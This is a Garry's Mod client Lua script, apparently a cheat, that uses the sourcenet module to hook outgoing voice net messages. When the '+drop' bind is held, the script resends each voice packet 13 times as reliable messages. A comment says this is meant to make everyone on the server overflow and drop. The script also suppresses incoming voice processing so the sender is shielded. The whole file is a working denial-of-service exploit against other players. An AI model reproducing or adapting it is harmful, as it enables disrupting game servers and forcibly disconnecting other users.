if SERVER then return end
require("sourcenet")

local dropping = 0

timer.Adjust("stopDropping", 1, 0, function()
	if dropping == 1 then dropping = 0 end
	timer.Stop("stopDropping")
end)

concommand.Add("+drop", function()
	dropping = 2
	RunConsoleCommand("+voicerecord")
	timer.Stop("stopDropping")
end)
concommand.Add("-drop", function()
	dropping = 1
	RunConsoleCommand("-voicerecord")
	timer.Start("stopDropping")
end)

hook.Add("SendNetMsg", "VoiceSpam", function(msg, reliable, voice)
	if dropping == 2 and string.find(string.lower(msg:GetName()), string.lower("voicedata")) then
		for i = 0, 12 do -- duplicate the voice message enough times and everyone overflows
			GetNetChannel():SendNetMsg(msg, true, true)
		end
	end
end)

hook.Add("ProcessVoiceData", "VoiceSpam2", function(msg)
	if dropping > 0 then return false end
end)

hook.Add("ProcessVoiceInit", "VoiceSpam3", function(msg)
	if dropping > 0 then return false end
end)